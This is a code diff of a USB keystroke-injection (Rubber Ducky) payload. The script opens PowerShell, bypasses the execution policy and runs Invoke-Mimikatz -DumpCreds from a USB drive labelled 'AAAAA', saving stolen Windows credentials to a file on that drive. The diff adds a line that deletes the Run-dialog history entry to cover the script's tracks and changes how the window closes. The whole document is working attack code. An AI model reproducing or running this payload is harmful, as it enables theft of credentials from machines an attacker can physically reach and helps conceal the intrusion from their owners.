@@ -9,7 +9,11 @@ ALT y
 DELAY 500
 ENTER
 ENTER
+REM -------------download appropriate mimikatz for architecture
 STRING powershell  
+ENTER
+DELAY 500
+STRING Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name (Get-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' | findstr /C:'powershell Start-Process cmd').SubString(31,1)
 ENTER
 DELAY 500
 STRING $drive = (wmic volume get driveletter,label| findstr "AAAAA").Substring(0,2)
@@ -19,8 +23,8 @@ REM Just in case they have set-executionpolicy set to restricted.
 STRING set-executionpolicy -executionpolicy bypass -scope currentuser
 ENTER
 DELAY 500
-STRING Import-Module $drive\pw.ps1; Invoke-Mimikatz -DumpCreds >>$drive\stuff.txt
+STRING Import-Module $drive\pw.ps1; Invoke-Mimikatz -DumpCreds >>$drive\stuff.txt ; exit
 ENTER
-REM Lets close the window, so we don't have to manually
 DELAY 500
-ALT F4
+STRING exit
+ENTER
